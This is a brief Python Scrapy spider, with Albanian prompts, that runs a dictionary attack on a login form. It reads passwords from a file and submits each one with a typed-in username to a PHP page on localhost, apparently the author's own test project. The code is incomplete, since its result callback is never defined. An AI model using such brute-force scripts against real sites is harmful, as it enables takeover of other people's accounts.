import scrapy
import sys

class DictSpider(scrapy.Spider):
    name = 'dict'
    allowed_domains = ['google.com']
    start_urls = ['http://localhost:1234/activebody_final3/ballina.php']

    def __init__(self):
        self.search = [str(x).strip() for x in open('pass.txt', 'rt')]
        super().__init__()


    def parse(self, response):
        print('Jepeni username: ')
        x = input()
        for search in self.search:
            print('Testimi i Passwordit "{}"'.format(search))
            yield scrapy.FormRequest(
                url='http://localhost:1234/activebody_final3/ballina.php',
                formdata={
                    'username': '{}'.format(x),
                    'password': '{}'.format(search),
                    'submit': 'Kyqu'
                },
                meta={
                    'x':x,
                    'search':search
                },
                dont_filter=True,
                callback=self.getPageSearch
            )


